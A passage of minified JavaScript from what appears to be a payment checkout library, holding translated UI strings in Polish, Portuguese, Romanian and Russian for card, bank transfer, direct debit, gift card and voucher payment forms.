karty","creditCard.encryptedExpiryYear.aria.label":"Pole roku wygaśnięcia","creditCard.encryptedSecurityCode.aria.iframeTitle":"Element Iframe dla kodu bezpieczeństwa zabezpieczonej karty","creditCard.encryptedSecurityCode.aria.label":"Pole kodu bezpieczeństwa","giftcard.encryptedCardNumber.aria.iframeTitle":"Element Iframe dla numeru zabezpieczonej karty podarunkowej","giftcard.encryptedCardNumber.aria.label":"Pole numeru karty podarunkowej","giftcard.encryptedSecurityCode.aria.iframeTitle":"Element Iframe dla kodu bezpieczeństwa zabezpieczonej karty podarunkowej","giftcard.encryptedSecurityCode.aria.label":"Pole kodu bezpieczeństwa karty podarunkowej",giftcardTransactionLimit:"Maks. dozwolona kwota (%{amount}) na transakcję tą kartą upominkową","ach.encryptedBankAccountNumber.aria.iframeTitle":"Element Iframe dla zabezpieczonego numeru rachunku bankowego","ach.encryptedBankAccountNumber.aria.label":"Pole rachunku bankowego","ach.encryptedBankLocationId.aria.iframeTitle":"Element Iframe dla zabezpieczonego kodu bankowego (Bank Routing Number)","ach.encryptedBankLocationId.aria.label":"Pole kodu bankowego (Bank Routing Number)"}}),tg=Object.freeze({__proto__:null,default:{payButton:"Pagar","payButton.redirecting":"Redirecionando...",storeDetails:"Salvar para meu próximo pagamento","creditCard.holderName":"Nome no cartão","creditCard.holderName.placeholder":"J. Smith","creditCard.holderName.invalid":"Nome do titular do cartão inválido","creditCard.numberField.title":"Número do cartão","creditCard.numberField.placeholder":"1234 5678 9012 3456","creditCard.expiryDateField.title":"Data de validade","creditCard.expiryDateField.placeholder":"MM/AA","creditCard.expiryDateField.month":"Mês","creditCard.expiryDateField.month.placeholder":"MM","creditCard.expiryDateField.year.placeholder":"AA","creditCard.expiryDateField.year":"Ano","creditCard.cvcField.title":"CVC / CVV","creditCard.cvcField.placeholder":"123","creditCard.storeDetailsButton":"Lembrar para a próxima vez","creditCard.cvcField.placeholder.4digits":"4 dígitos","creditCard.cvcField.placeholder.3digits":"3 dígitos","creditCard.taxNumber.placeholder":"AAAMMDD / 0123456789",installments:"Opções de Parcelamento",installmentOption:"%{times}x %{partialValue}",installmentOptionMonths:"%{times} meses","installments.oneTime":"Pagamento à vista","installments.installments":"Pagamento parcelado","installments.revolving":"Pagamento rotativo","sepaDirectDebit.ibanField.invalid":"Número de conta inválido","sepaDirectDebit.nameField.placeholder":"J. Silva","sepa.ownerName":"Nome do titular da conta bancária","sepa.ibanNumber":"Número de conta (NIB)","error.title":"Erro","error.subtitle.redirect":"Falha no redirecionamento","error.subtitle.payment":"Falha no pagamento","error.subtitle.refused":"Pagamento recusado","error.message.unknown":"Ocorreu um erro desconhecido","idealIssuer.selectField.title":"Banco","idealIssuer.selectField.placeholder":"Selecione seu banco","creditCard.success":"Pagamento bem-sucedido",loading:"Carregando...",continue:"Continuar",continueTo:"Continuar para","wechatpay.timetopay":"Você tem %@ para pagar","wechatpay.scanqrcode":"Escanear código QR",personalDetails:"Informações pessoais",companyDetails:"Dados da empresa","companyDetails.name":"Nome da empresa","companyDetails.registrationNumber":"Número de registro",socialSecurityNumber:"CPF",firstName:"Nome",infix:"Prefixo",lastName:"Sobrenome",mobileNumber:"Celular","mobileNumber.invalid":"Número de celular inválido",city:"Cidade",postalCode:"CEP",countryCode:"Código do país",telephoneNumber:"Número de telefone",dateOfBirth:"Data de nascimento",shopperEmail:"Endereço de e-mail",gender:"Gênero",male:"Masculino",female:"Feminino",billingAddress:"Endereço de cobrança",street:"Rua",stateOrProvince:"Estado ou província",country:"País",houseNumberOrName:"Número da casa",separateDeliveryAddress:"Especificar um endereço de entrega separado",deliveryAddress:"Endereço de entrega",zipCode:"Código postal",apartmentSuite:"Apartamento/Conjunto",provinceOrTerritory:"Província ou território",cityTown:"Cidade",address:"Endereço",state:"Estado","field.title.optional":"(opcional)","creditCard.cvcField.title.optional":"CVC / CVV (opcional)","issuerList.wallet.placeholder":"Selecione uma carteira",privacyPolicy:"Política de Privacidade","afterPay.agreement":"Eu concordo com as %@ do AfterPay",paymentConditions:"condições de pagamento",openApp:"Abrir o aplicativo","voucher.readInstructions":"Leia as instruções","voucher.introduction":"Obrigado pela sua compra, use o cupom a seguir para concluir o seu pagamento.","voucher.expirationDate":"Data de validade","voucher.alternativeReference":"Referência alternativa","dragonpay.voucher.non.bank.selectField.placeholder":"Selecione o seu fornecedor","dragonpay.voucher.bank.selectField.placeholder":"Selecione seu banco","voucher.paymentReferenceLabel":"Referência de pagamento","voucher.surcharge":"Inclui %@ de sobretaxa","voucher.introduction.doku":"Obrigado pela sua compra, use a informação a seguir para concluir o seu pagamento.","voucher.shopperName":"Nome do consumidor","voucher.merchantName":"Comerciante online","voucher.introduction.econtext":"Obrigado pela sua compra, use a informação a seguir para concluir o seu pagamento.","voucher.telephoneNumber":"Número de telefone","voucher.shopperReference":"Referência do consumidor","voucher.collectionInstitutionNumber":"Número da instituição de cobrança","voucher.econtext.telephoneNumber.invalid":"O número de telefone deve ter 10 ou 11 dígitos","boletobancario.btnLabel":"Gerar Boleto","boleto.sendCopyToEmail":"Enviar uma cópia por e-mail","button.copy":"Copiar","button.download":"Baixar","creditCard.storedCard.description.ariaLabel":"O cartão armazenado termina em %@","voucher.entity":"Entidade",donateButton:"Doar",notNowButton:"Agora não",thanksForYourSupport:"Obrigado pelo apoio!",preauthorizeWith:"Pré-autorizar com",confirmPreauthorization:"Confirmar pré-autorização",confirmPurchase:"Confirmar compra",applyGiftcard:"Resgatar",giftcardBalance:"Saldo do vale-presente",deductedBalance:"Saldo debitado","creditCard.pin.title":"Pin","creditCard.encryptedPassword.label":"Primeiros dois dígitos da senha do cartão","creditCard.encryptedPassword.placeholder":"12","creditCard.encryptedPassword.invalid":"Senha inválida","creditCard.taxNumber.label":"Data de nascimento do titular do cartão (AAMMDD) ou número de registro corporativo (10 dígitos)","creditCard.taxNumber.labelAlt":"Número de registro corporativo (10 dígitos)","creditCard.taxNumber.invalid":"Data de nascimento do titular do cartão ou número de registro corporativo inválidos","storedPaymentMethod.disable.button":"Remover","storedPaymentMethod.disable.confirmation":"Remover método de pagamento armazenado","storedPaymentMethod.disable.confirmButton":"Sim, remover","storedPaymentMethod.disable.cancelButton":"Cancelar","ach.bankAccount":"Conta bancária","ach.accountHolderNameField.title":"Nome do titular da conta","ach.accountHolderNameField.placeholder":"J. Smith","ach.accountHolderNameField.invalid":"Nome do titular da conta inválido","ach.accountNumberField.title":"Número da conta","ach.accountNumberField.invalid":"Número de conta inválido","ach.accountLocationField.title":"Número de roteamento ABA","ach.accountLocationField.invalid":"Número de roteamento ABA inválido","select.state":"Selecionar estado","select.stateOrProvince":"Selecione estado ou província","select.provinceOrTerritory":"Selecionar província ou território","select.country":"Selecione o país","select.noOptionsFound":"Nenhuma opção encontrada","select.filter.placeholder":"Pesquisar...","telephoneNumber.invalid":"Número de telefone inválido",qrCodeOrApp:"ou","paypal.processingPayment":"Processando pagamento...",generateQRCode:"Gerar código QR","await.waitForConfirmation":"Aguardando confirmação","mbway.confirmPayment":"Confirme seu pagamento no aplicativo MB WAY","shopperEmail.invalid":"Endereço de e-mail inválido","dateOfBirth.format":"DD/MM/AAAA","dateOfBirth.invalid":"Você deve ter pelo menos 18 anos","blik.confirmPayment":"Abra o aplicativo do seu banco para confirmar o pagamento.","blik.invalid":"Digite 6 números","blik.code":"Código de 6 dígitos","blik.help":"Obtenha o código no aplicativo do seu banco.","swish.pendingMessage":"Depois de escanear o QR, o status pode ficar pendente por até 10 minutos. Não tente refazer o pagamento antes desse período para evitar cobrança duplicada.","error.va.gen.01":"Campo incompleto","error.va.gen.02":"Campo inválido","error.va.sf-cc-num.01":"Número de cartão inválido","error.va.sf-cc-num.03":"O cartão inserido não é aceito","error.va.sf-cc-dat.01":"Cartão muito antigo","error.va.sf-cc-dat.02":"Data muito distante","error.va.sf-cc-dat.03":"Seu cartão expira antes da data do pagamento","error.giftcard.no-balance":"Este vale-presente tem saldo zero","error.giftcard.card-error":"Não existe um vale-presente com esse número em nossos registros","error.giftcard.currency-error":"Os vales-presente são válidos somente na moeda em que foram emitidos","amazonpay.signout":"Sair do Amazon","amazonpay.changePaymentDetails":"Alterar dados de pagamento","partialPayment.warning":"Selecione outro método de pagamento para pagar o restante","partialPayment.remainingBalance":"O saldo restante será %{amount}","bankTransfer.beneficiary":"Beneficiário","bankTransfer.iban":"IBAN","bankTransfer.bic":"BIC","bankTransfer.reference":"Referência","bankTransfer.introduction":"Continue criando o novo pagamento por transferência bancária. Use as informações na tela a seguir para concluí-lo.","bankTransfer.instructions":"Obrigado pela sua compra, use a informação a seguir para concluir o seu pagamento.","bacs.accountHolderName":"Nome do titular da conta bancária","bacs.accountHolderName.invalid":"Nome do titular da conta bancária inválido","bacs.accountNumber":"Número da conta bancária","bacs.accountNumber.invalid":"Número da conta bancária inválido","bacs.bankLocationId":"Código de classificação","bacs.bankLocationId.invalid":"Código de classificação inválido","bacs.consent.amount":"Concordo que o valor acima seja deduzido da minha conta bancária.","bacs.consent.account":"Confirmo que a conta está em meu nome e que sou o único signatário que deve autorizar o débito direto nessa conta.",edit:"Editar","bacs.confirm":"Confirmar e pagar","bacs.result.introduction":"Baixar instrução de débito direto (DDI)","download.pdf":"Baixar PDF","creditCard.encryptedCardNumber.aria.iframeTitle":"Iframe para número de cartão seguro","creditCard.encryptedCardNumber.aria.label":"Campo de número de cartão","creditCard.encryptedExpiryDate.aria.iframeTitle":"Iframe para data de validade do cartão seguro","creditCard.encryptedExpiryDate.aria.label":"Campo de data de validade","creditCard.encryptedExpiryMonth.aria.iframeTitle":"Iframe para mês de validade do cartão seguro","creditCard.encryptedExpiryMonth.aria.label":"Campo de mês de validade","creditCard.encryptedExpiryYear.aria.iframeTitle":"Iframe para ano de validade do cartão seguro","creditCard.encryptedExpiryYear.aria.label":"Campo de ano de validade","creditCard.encryptedSecurityCode.aria.iframeTitle":"Iframe para código de segurança do cartão seguro","creditCard.encryptedSecurityCode.aria.label":"Campo de código de segurança","giftcard.encryptedCardNumber.aria.iframeTitle":"Iframe para número de cartão-presente seguro","giftcard.encryptedCardNumber.aria.label":"Campo de número do cartão-presente","giftcard.encryptedSecurityCode.aria.iframeTitle":"Iframe para código de segurança do cartão-presente seguro","giftcard.encryptedSecurityCode.aria.label":"Campo de código de segurança do cartão-presente",giftcardTransactionLimit:"Máximo de %{amount} permitido por transação neste cartão-presente","ach.encryptedBankAccountNumber.aria.iframeTitle":"Iframe para número de conta bancária segura","ach.encryptedBankAccountNumber.aria.label":"Campo de conta bancária","ach.encryptedBankLocationId.aria.iframeTitle":"Iframe para número de roteamento bancário seguro","ach.encryptedBankLocationId.aria.label":"Campo de número de roteamento bancário","pix.instructions":"Abra o app com sua chave PIX cadastrada, escolha Pagar com Pix e escaneie o QR Code ou copie e cole o código"}}),ng=Object.freeze({__proto__:null,default:{payButton:"Plătiți","payButton.redirecting":"Se redirecționează...",storeDetails:"Salvează pentru următoarea mea plată","creditCard.holderName":"Numele de pe card","creditCard.holderName.placeholder":"J. Smith","creditCard.holderName.invalid":"Numele posesorului de card este incorect","creditCard.numberField.title":"Număr card","creditCard.numberField.placeholder":"1234 5678 9012 3456","creditCard.expiryDateField.title":"Data expirării","creditCard.expiryDateField.placeholder":"LL/AA","creditCard.expiryDateField.month":"Lună","creditCard.expiryDateField.month.placeholder":"LL","creditCard.expiryDateField.year.placeholder":"AA","creditCard.expiryDateField.year":"An","creditCard.cvcField.title":"CVC/CVV","creditCard.cvcField.placeholder":"123","creditCard.storeDetailsButton":"Reține pentru data viitoare","creditCard.cvcField.placeholder.4digits":"4 cifre","creditCard.cvcField.placeholder.3digits":"3 cifre","creditCard.taxNumber.placeholder":"AALLZZ / 0123456789",installments:"Număr de rate",installmentOption:"%{times}x %{partialValue}",installmentOptionMonths:"%{times} luni","installments.oneTime":"Plată unică","installments.installments":"Plată în rate","installments.revolving":"Plată recurentă","sepaDirectDebit.ibanField.invalid":"Numărul de cont este incorect","sepaDirectDebit.nameField.placeholder":"J. Smith","sepa.ownerName":"Nume posesor","sepa.ibanNumber":"Număr cont (IBAN)","error.title":"Eroare","error.subtitle.redirect":"Redirecționare eșuată","error.subtitle.payment":"Plată eșuată","error.subtitle.refused":"Plată refuzată","error.message.unknown":"S-a produs o eroare necunoscută","idealIssuer.selectField.title":"Bancă","idealIssuer.selectField.placeholder":"Selectați-vă banca","creditCard.success":"Plată reușită",loading:"Se încarcă...",continue:"Continuare",continueTo:"Continuați către","wechatpay.timetopay":"Trebuie să achitați %@","wechatpay.scanqrcode":"Scanați codul QR",personalDetails:"Informații personale",companyDetails:"Informații societate","companyDetails.name":"Denumirea societății","companyDetails.registrationNumber":"Număr de înregistrare",socialSecurityNumber:"Cod numeric personal",firstName:"Prenume",infix:"Titulatură",lastName:"Nume de familie",mobileNumber:"Număr de mobil","mobileNumber.invalid":"Număr de telefon mobil incorect",city:"Oraș",postalCode:"Cod poștal",countryCode:"Codul țării",telephoneNumber:"Număr de telefon",dateOfBirth:"Data nașterii",shopperEmail:"Adresă de e-mail",gender:"Gen",male:"Bărbat",female:"Femeie",billingAddress:"Adresa de facturare",street:"Strada",stateOrProvince:"Județ sau provincie",country:"Țară",houseNumberOrName:"Număr",separateDeliveryAddress:"Specificați o adresă de livrare separată",deliveryAddress:"Adresă de livrare",zipCode:"Cod poștal",apartmentSuite:"Apartament",provinceOrTerritory:"Provincie sau teritoriu",cityTown:"Oraș/localitate",address:"Adresă",state:"Stat","field.title.optional":"(opțional)","creditCard.cvcField.title.optional":"CVC/CVV (opțional)","issuerList.wallet.placeholder":"Selectați-vă portofelul",privacyPolicy:"Politica de confidențialitate","afterPay.agreement":"Sunt de acord cu %@ aparținând AfterPay",paymentConditions:"condiții de plată",openApp:"Deschideți aplicația","voucher.readInstructions":"Citiți instrucțiunile","voucher.introduction":"Vă mulțumim pentru cumpărături, vă rugăm să utilizați următorul cupon pentru a vă finaliza plata.","voucher.expirationDate":"Data de expirare","voucher.alternativeReference":"Referință alternativă","dragonpay.voucher.non.bank.selectField.placeholder":"Selectați furnizorul dvs.","dragonpay.voucher.bank.selectField.placeholder":"Selectați banca dvs.","voucher.paymentReferenceLabel":"Referința plății","voucher.surcharge":"Include suprataxa de %@","voucher.introduction.doku":"Vă mulțumim pentru cumpărături, vă rugăm să utilizați următoarele informații pentru a vă finaliza plata.","voucher.shopperName":"Nume cumpărător","voucher.merchantName":"Comerciant","voucher.introduction.econtext":"Vă mulțumim pentru cumpărături, vă rugăm să utilizați următoarele informații pentru a vă finaliza plata.","voucher.telephoneNumber":"Număr de telefon","voucher.shopperReference":"Referință cumpărător","voucher.collectionInstitutionNumber":"Număr instituție de colectare","voucher.econtext.telephoneNumber.invalid":"Numărul de telefon trebuie să aibă 10 sau 11 cifre","boletobancario.btnLabel":"Generare Boleto","boleto.sendCopyToEmail":"Trimite o copie la adresa mea de e-mail","button.copy":"Copiere","button.download":"Descărcare","creditCard.storedCard.description.ariaLabel":"Cardul memorat se termină în %@","voucher.entity":"Entitate",donateButton:"Donați",notNowButton:"Nu acum",thanksForYourSupport:"Vă mulțumim pentru sprijin!",preauthorizeWith:"Preautorizare cu",confirmPreauthorization:"Confirmați preautorizarea",confirmPurchase:"Confirmați achiziția",applyGiftcard:"Valorificare",giftcardBalance:"Soldul de pe cardul cadou",deductedBalance:"Sold scăzut","creditCard.pin.title":"PIN","creditCard.encryptedPassword.label":"Primele 2 cifre ale parolei aferente cardului","creditCard.encryptedPassword.placeholder":"12","creditCard.encryptedPassword.invalid":"Parolă incorectă","creditCard.taxNumber.label":"Data de naștere a posesorului de card (AALLZZ) sau numărul de înregistrare al societății (10 cifre).","creditCard.taxNumber.labelAlt":"Numărul de înregistrare al societății (10 cifre)","creditCard.taxNumber.invalid":"Data de naștere a posesorului de card sau numărul de înregistrare al societății este incorect","storedPaymentMethod.disable.button":"Ștergere","storedPaymentMethod.disable.confirmation":"Ștergeți metoda de plată memorată","storedPaymentMethod.disable.confirmButton":"Da, șterge","storedPaymentMethod.disable.cancelButton":"Anulare","ach.bankAccount":"Cont bancar","ach.accountHolderNameField.title":"Numele titularului de cont","ach.accountHolderNameField.placeholder":"J. Smith","ach.accountHolderNameField.invalid":"Numele titularului de cont este incorect","ach.accountNumberField.title":"Număr de cont","ach.accountNumberField.invalid":"Numărul de cont este incorect","ach.accountLocationField.title":"Număr de direcționare ABA","ach.accountLocationField.invalid":"Număr de direcționare ABA incorect","select.state":"Selectați statul","select.stateOrProvince":"Selectați județul sau provincia","select.provinceOrTerritory":"Selectați provincia sau teritoriul","select.country":"Selectați țara","select.noOptionsFound":"Nu s-a găsit nicio opțiune","select.filter.placeholder":"Căutare...","telephoneNumber.invalid":"Număr de telefon incorect",qrCodeOrApp:"sau","paypal.processingPayment":"Se prelucrează plata...",generateQRCode:"Generați codul QR","await.waitForConfirmation":"Se așteaptă confirmarea","mbway.confirmPayment":"Confirmați plata în aplicația MB WAY","shopperEmail.invalid":"Adresă de e-mail incorectă","dateOfBirth.format":"ZZ/LL/AAAA","dateOfBirth.invalid":"Trebuie să aveți minimum 18 ani","blik.confirmPayment":"Deschideți aplicația dvs. de banking pentru a confirma plata.","blik.invalid":"Introduceți 6 cifre","blik.code":"Cod din 6 cifre","blik.help":"Obțineți codul din aplicația dvs. de banking.","swish.pendingMessage":"După ce scanați, starea poate fi „în așteptare” timp de maximum 10 minute. Încercările de a plăti din nou în acest răstimp pot genera prelevări multiple de fonduri.","error.va.gen.01":"Câmp incomplet","error.va.gen.02":"Câmp incorect","error.va.sf-cc-num.01":"Număr de card incorect","error.va.sf-cc-num.03":"A fost introdus un card neacceptat","error.va.sf-cc-dat.01":"Cardul este prea vechi","error.va.sf-cc-dat.02":"Data este prea departe în viitor","error.va.sf-cc-dat.03":"Cardul dvs. expiră înainte de data de check-out","error.giftcard.no-balance":"Acest card cadou are soldul zero","error.giftcard.card-error":"În evidențele noastre nu figurează niciun card cadou cu acest număr","error.giftcard.currency-error":"Cardurile cadou sunt valabile numai în moneda în care au fost emise","amazonpay.signout":"Deconectați-vă de pe platforma Amazon","amazonpay.changePaymentDetails":"Modificați detaliile de plată","partialPayment.warning":"Pentru a achita suma rămasă, selectați o altă metodă de plată","partialPayment.remainingBalance":"Soldul rămas va fi de %{amount}","bankTransfer.beneficiary":"Beneficiar","bankTransfer.iban":"IBAN","bankTransfer.bic":"BIC","bankTransfer.reference":"Referinţă","bankTransfer.introduction":"Continuați să creați o nouă plată prin transfer bancar. Puteți utiliza detaliile din ecranul următor pentru a finaliza această plată.","bankTransfer.instructions":"Vă mulțumim pentru cumpărături, vă rugăm să utilizați următoarele informații pentru a vă finaliza plata.","bacs.accountHolderName":"Numele titularului contului bancar","bacs.accountHolderName.invalid":"Numele titularului contului bancar este incorect","bacs.accountNumber":"Numărul contului bancar","bacs.accountNumber.invalid":"Numărul contului bancar este incorect","bacs.bankLocationId":"Cod de identificare bancară","bacs.bankLocationId.invalid":"Cod de identificare bancară incorect","bacs.consent.amount":"Sunt de acord ca suma menționată mai sus să fie dedusă din contul meu bancar.","bacs.consent.account":"Confirm că sunt titularul acestui cont și că sunt singurul semnatar necesar pentru autorizarea debitului direct pentru acest cont.",edit:"Editare","bacs.confirm":"Confirmați și plătiți","bacs.result.introduction":"Descărcați instrucțiunile de debitare directă (DDI/mandat)","download.pdf":"Descărcați PDF","creditCard.encryptedCardNumber.aria.iframeTitle":"Iframe pentru numărul cardului securizat","creditCard.encryptedCardNumber.aria.label":"Câmp aferent numărului cardului","creditCard.encryptedExpiryDate.aria.iframeTitle":"Iframe pentru data de expirare a cardului securizat","creditCard.encryptedExpiryDate.aria.label":"Câmp aferent datei de expirare","creditCard.encryptedExpiryMonth.aria.iframeTitle":"Iframe pentru luna de expirare a cardului securizat","creditCard.encryptedExpiryMonth.aria.label":"Câmp aferent lunii de expirare","creditCard.encryptedExpiryYear.aria.iframeTitle":"Iframe pentru anul de expirare a cardului securizat","creditCard.encryptedExpiryYear.aria.label":"Câmp aferent anului de expirare","creditCard.encryptedSecurityCode.aria.iframeTitle":"Iframe pentru codul de securitate al cardului securizat","creditCard.encryptedSecurityCode.aria.label":"Câmp aferent codului de securitate","giftcard.encryptedCardNumber.aria.iframeTitle":"Iframe pentru numărul cardului cadou securizat","giftcard.encryptedCardNumber.aria.label":"Câmp aferent numărului cardului cadou","giftcard.encryptedSecurityCode.aria.iframeTitle":"Iframe pentru codul de securitate al cardului cadou securizat","giftcard.encryptedSecurityCode.aria.label":"Câmp aferent codului de securitate al cardului cadou",giftcardTransactionLimit:"Pentru acest card cadou, suma maximă permisă per tranzacție este de %{amount}","ach.encryptedBankAccountNumber.aria.iframeTitle":"Iframe pentru numărul contului bancar securizat","ach.encryptedBankAccountNumber.aria.label":"Câmp aferent contului bancar","ach.encryptedBankLocationId.aria.iframeTitle":"Iframe pentru numărul securizat de direcționare bancară (routing number)","ach.encryptedBankLocationId.aria.label":"Câmp aferent codului de direcționare bancară (routing number)"}}),rg=Object.freeze({__proto__:null,default:{payButton:"Заплатить","payButton.redirecting":"Перенаправление...",storeDetails:"Сохранить для следующего платежа","creditCard.holderName":"Имя на карте","creditCard.holderName.placeholder":"И. Петров","creditCard.holderName.invalid":"Неверное имя владельца карты","creditCard.numberField.title":"Номер карты","creditCard.numberField.placeholder":"1234 5678 9012 3456","creditCard.expiryDateField.title":"Срок действия","creditCard.expiryDateField.placeholder":"ММ/ГГ","creditCard.expiryDateField.month":"Месяц","creditCard.expiryDateField.month.placeholder":"ММ","creditCard.expiryDateField.year.placeholder":"ГГ","creditCard.expiryDateField.year":"Год","creditCard.cvcField.title":"CVC / CVV","creditCard.cvcField.placeholder":"123","creditCard.storeDetailsButton":"Запомнить на следующий раз","creditCard.cvcField.placeholder.4digits":"4 цифры","creditCard.cvcField.placeholder.3digits":"3 цифры","creditCard.taxNumber.placeholder":"ГГММДД / 0123456789",installments:"Количество платежей",installmentOption:"%{times}× %{partialValue}",installmentOptionMonths:"%{times} мес.","installments.oneTime":"Одноразовый платеж","installments.installments":"Рассрочка","installments.revolving":"Повторяющаяся оплата","sepaDirectDebit.ibanField.invalid":"Недействительный номер счета","sepaDirectDebit.nameField.placeholder":"И. Петров","sepa.ownerName":"Имя владельца","sepa.ibanNumber":"Номер счета (IBAN)","error.title":"Ошибка","error.subtitle.redirect":"Сбой перенаправления","error.subtitle.payment":"Сбой оплаты","error.subtitle.refused":"Оплата отклонена","error.message.unknown":"Возникла неизвестная ошибка","idealIssuer.selectField.title":"Банк","idealIssuer.selectField.placeholder":"Выберите банк","creditCard.success":"Платеж успешно завершен",loading:"Загрузка…",continue:"Продолжить",continueTo:"Перейти к","wechatpay.timetopay":"У вас %@ на оплату","wechatpay.scanqrcode":"Сканировать QR-код",personalDetails:"Личные данные",companyDetails:"Данные компании","companyDetails.name":"Название компании","companyDetails.registrationNumber":"Регистрационный номер",socialSecurityNumber:"Номер социального страхования или ИНН",firstName:"Имя",infix:"Приставка",lastName:"Фамилия",mobileNumber:"Мобильный телефон","mobileNumber.invalid":"Недействительной номер мобильного",city:"Город",postalCode:"Почтовый индекс",countryCode:"Код страны",telephoneNumber:"Номер телефона",dateOfBirth:"Дата рождения",shopperEmail:"Адрес эл. почты",gender:"Пол",male:"Мужчина",female:"Женщина",billingAddress:"Платежный адрес",street:"Улица",stateOrProvince:"Регион",country:"Страна",houseNumberOrName:"Номер дома",separateDeliveryAddress:"Укажите отдельный адрес доставки",deliveryAddress:"Адрес доставки",zipCode:"Почтовый индекс",apartmentSuite:"Квартира",provinceOrTerritory:"Провинция или территория",cityTown:"Город",address:"Адрес",state:"Штат","field.title.optional":"(необязательно)","creditCard.cvcField.title.optional":"CVC / CVV (необязательно)","issuerList.wallet.placeholder":"Выберите кошелек",privacyPolicy:"Политика конфиденциальности","afterPay.agreement":"Я принимаю %@ AfterPay",paymentConditions:"условия оплаты",openApp:"Открыть приложение","voucher.readInstructions":"Прочитайте инструкции","voucher.introduction":"Благодарим за покупку. Для завершения оплаты используйте следующий купон.","voucher.expirationDate":"Срок действия","voucher.alternativeReference":"Другой код","dragonpay.voucher.non.bank.selectField.placeholder":"Выберите своего оператора","dragonpay.voucher.bank.selectField.placeholder":"Выберите банк","voucher.paymentReferenceLabel":"Код оплаты","voucher.surcharge":"Вкл. комиссию %@","voucher.introduction.doku":"Благодарим за покупку. Для завершения оплаты используйте следующие сведения.","voucher.shopperName":"Имя покупателя","voucher.merchantName":"Продавец","voucher.introduction.econtext":"Благодарим за покупку. Для завершения оплаты используйте следующие сведения.","voucher.telephoneNumber":"Номер телефона","voucher.shopperReference":"Справочник покупателя","voucher.collectionInstitutionNumber":"Номер получателя средств","voucher.econtext.telephoneNumber.invalid":"Номер телефона должен быть длиной 10 или 11 цифр","boletobancario.btnLabel":"Создать Boleto","boleto.sendCopyToEmail":"Отправить мне копию на эл. почту","button.copy":"Копия","button.download":"Загрузить","creditCard.storedCard.description.ariaLabel":"Сохраненная карта заканчивается на %@","voucher.entity":"Объект",donateButton:"Пожертвовать",notNowButton:"Позже",thanksForYourSupport:"Благодарим за поддержку!",preauthorizeWith:"Предавторизация в",confirmPreauthorization:"Подтвердить предавторизацию",confirmPurchase:"Подтвердить покупку",applyGiftcard:"Использовать",giftcardBalance:"Баланс подарочной карты",deductedBalance:"Баланс списаний","creditCard.pin.title":"PIN-код","creditCard.encryptedPassword.label":"Первые 2 цифры пароля карты","creditCard.encryptedPassword.placeholder":"12","creditCard.encryptedPassword.invalid":"Неверный пароль","creditCard.taxNumber.label":"Дата рождения владельца карты (ГГММДД) или регистрационный номер предприятия (10 цифр)","creditCard.taxNumber.labelAlt":"Регистрационный номер предприятия (10 цифр)","creditCard.taxNumber.invalid":"Неверная дата рождения владельца карты или регистрационного номера предприятия","storedPaymentMethod.disable.button":"Удалить","storedPaymentMethod.disable.confirmation":"Удалить сохраненный способ оплаты","storedPaymentMethod.disable.confirmButton":"Да, удалить","storedPaymentMethod.disable.cancelButton":"Отменить","ach.bankAccount":"Банковский счет","ach.accountHolderNameField.title":"Имя владельца карты","ach.accountHolderNameField.placeholder":"И. Петров","ach.accountHolderNameField.invalid":"Недействительное имя владельца карты","ach.accountNumberField.title":"Номер счета","ach.accountNumberField.invalid":"Недействительный номер счета","ach.accountLocationField.title":"Маршрутный номер ABA","ach.accountLocationField.invalid":"Недействительный маршрутный номер ABA","select.state":"Выберите штат","select.stateOrProvince":"Выберите штат или область","select.provinceOrTerritory":"Выберите провинцию или территорию","select.country":"Выберите страну","select.noOptionsFound":"Вариантов не найдено","select.filter.placeholder":"Поиск…","telephoneNumber.invalid":"Недействительный номер телефона",qrCodeOrApp:"или","paypal.processingPayment":"Платеж обрабатывается…",generateQRCode:"Создать QR-код","await.waitForConfirmation":"Ожидание подтверждения","mbway.confirmPayment":"Подтвердите оплату в приложении MB WAY","shopperEmail.invalid":"Недействительный адрес эл. почты","dateOfBirth.format":"ДД/ММ/ГГГГ","dateOfBirth.invalid":"Вам должно быть 18 лет или больше","blik.confirmPayment":"Для подтверждения оплаты откройте приложение банка.","blik.invalid":"Введите 6 цифр","blik.code":"6-значный код","blik.help":"Получите код из банковского приложения.","swish.pendingMessage":"Обработка оплаты после сканирования может занять 10 минут. Попытка провести оплату повторно в течение указанного времени может привести к нескольким списаниям со счета.","error.va.gen.01":"Незаполненное поле","error.va.gen.02":"Недействительное поле","error.va.sf-cc-num.01":"Недействительный номер карты","error.va.sf-cc-num.03":"Введена неподдерживаемая карта","error.va.sf-cc-dat.01":"Устаревшая карта","error.va.sf-cc-dat.02":"Дата слишком далеко в будущем","error.va.sf-cc-dat.03":"Срок действия вашей карты истекает до даты оплаты","error.giftcard.no-balance":"На этой подарочной карте нет средств","error.giftcard.card-error":"У нас не зарегистрирована карта с таким номером","error.giftcard.currency-error":"Принимаются только подарочные карты соответствующей валюты","amazonpay.signout":"Выйти из Amazon","amazonpay.changePaymentDetails":"Изменить информацию об оплате","partialPayment.warning":"Выбрать другой способ оплаты остатка","partialPayment.remainingBalance":"Остаток на балансе составит %{amount}","bankTransfer.beneficiary":"Получатель","bankTransfer.iban":"IBAN","bankTransfer.bic":"BIC","bankTransfer.reference":"Ссылка","bankTransfer.introduction":"Для создания нового банковского перечисления перейдите далее. Для окончательного оформления платежа используйте сведения на следующем экране.","bankTransfer.instructions":"Благодарим за покупку. Для завершения оплаты используйте следующие сведения.","bacs.accountHolderName":"Имя владельца банковского счета","bacs.accountHolderName.invalid":"Неверное имя владельца банковского счета","bacs.accountNumber":"Номер банковского счета","bacs.accountNumber.invalid":"Неверный номер банковского счета","bacs.bankLocationId":"Код банка","bacs.bankLocationId.invalid":"Неверный код банка","bacs.consent.amount":"Выражаю согласие на списание вышеуказанной суммы с моего банковского счета.","bacs.consent.account":"Подтверждаю, что счет оформлен на мое имя и что я – единственное лицо, имеющее право подписи, разрешающей прямое дебетование средств со счета.",edit:"Изменить","bacs.confirm":"Подтвердить и оплатить","bacs.result.introduction":"Загрузить распоряжение прямого дебетования (DDI / поручение)","download.pdf":"Загрузить PDF","creditCard.encryptedCardNumber.aria.iframeTitle":"Iframe для защиты номера карты","creditCard.encryptedCardNumber.aria.label":"Поле номера карты","creditCard.encryptedExpiryDate.aria.iframeTitle":"Iframe для защиты даты срока действия карты","creditCard.encryptedExpiryDate.aria.label":"Поле даты срока действия","creditCard.encryptedExpiryMonth.aria.iframeTitle":"Iframe для защиты данных месяца срока действия карты","creditCard.encryptedExpiryMonth.aria.label":"Поле месяца срока действия","creditCard.encryptedExpiryYear.aria.iframeTitle":"Iframe для защиты данных года срока действия карты","creditCard.encryptedExpiryYear.aria.label":"Поле года срока 